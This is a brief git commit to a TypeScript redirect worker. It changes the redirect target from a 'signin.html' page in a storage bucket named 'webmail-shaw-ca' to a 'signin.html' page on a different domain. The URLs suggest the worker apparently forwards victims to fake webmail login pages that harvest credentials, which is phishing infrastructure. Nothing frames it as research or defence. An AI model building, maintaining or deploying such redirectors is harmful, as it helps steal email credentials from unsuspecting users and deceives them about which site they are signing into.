26f37e1e62892d04f8121273887e32c5b1f90274
Gram77 <wonderland070@outlook.com>
2025-09-30 09:03:09 -0700

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://webmail-shaw-ca.s3.us-east-005.backblazeb2.com/signin.html"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://clarksvilleads.com/signin.html"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
